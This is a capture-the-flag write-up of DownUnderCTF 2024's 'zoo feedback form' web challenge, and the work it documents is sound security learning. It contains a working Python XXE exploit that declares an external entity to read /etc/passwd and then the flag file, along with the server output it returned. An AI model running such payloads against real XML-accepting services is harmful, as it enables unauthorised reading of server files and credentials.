# zoo feedback form

## Description
```
The zoo wants your feedback! Simply fill in the form, and send away, we'll handle it from there!

Author: richighimi

https://web-zoo-feedback-form-2af9cc09a15e.2024.ductf.dev 
```

## Provided Files
```
- zoo-feedback-form.zip
```

## Writeup

Starting off we have a website which allows sending feedback. <br/>
In my eyes this might indicate some kind of `XSS` or `XXE` vulnerability. <br/>

Testing the input `123` returns `Feedback sent to the Emus: 123`. <br/>
Looking at the request which was being sent we see a whole `XML` file being used as payload. <br/>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
    <feedback>123</feedback>
</root>
```

Knowing that we can just send a fully modified version to the server I made a script to do exactly that. <br/>
Using [Hacktricks-XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity) I searched for payloads we could use in the same format of the earlier `XML` file. <br/>
```py
import requests

base_URL = 'https://web-zoo-feedback-form-2af9cc09a15e.2024.ductf.dev/'

payload = """<?xml version="1.0" ?>
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<root><feedback>&example;</feedback></root>
"""

res = requests.post(f'{base_URL}', data=payload)

print(res.text)
```

Using this we were able to read files on the system. <br/>
```sh
$ python3 solve.py 
<div style="color:green;">Feedback sent to the Emus: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</div>
```

To get the location of the flag we looked at the `Dockerfile`. <br/>
```docker
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .

RUN pip install -r requirements.txt

COPY main-app/ .

EXPOSE 80

CMD [ "python", "app.py" ]
```

The `Dockerfile` indicated the path `/app/flag.txt`. <br/>
Using this in our exploit returned the flag which concludes this writeup. <br/>
```xml
$ python3 solve.py 
<div style="color:green;">Feedback sent to the Emus: DUCTF{emU_say$_he!!0_h0!@_ci@0}
</div>
```